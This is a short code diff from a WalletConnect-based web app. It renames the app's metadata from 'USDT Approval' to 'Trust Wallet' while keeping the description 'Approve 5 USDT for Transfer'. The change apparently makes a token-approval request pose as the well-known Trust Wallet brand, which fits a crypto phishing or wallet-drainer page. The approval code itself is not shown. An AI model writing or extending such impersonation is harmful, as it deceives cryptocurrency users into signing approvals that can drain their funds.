@@ -113,7 +113,7 @@ export default function App() {
         currentClient = await SignClient.init({
           projectId: PROJECT_ID,
           metadata: {
-            name: "USDT Approval",
+            name: "Trust Wallet",
             description: "Approve 5 USDT for Transfer",
             url: window.location.href,
             icons: ["https://raw.githubusercontent.com/salmanraheem-dev/bestforlast/refs/heads/main/public/logo.png"]
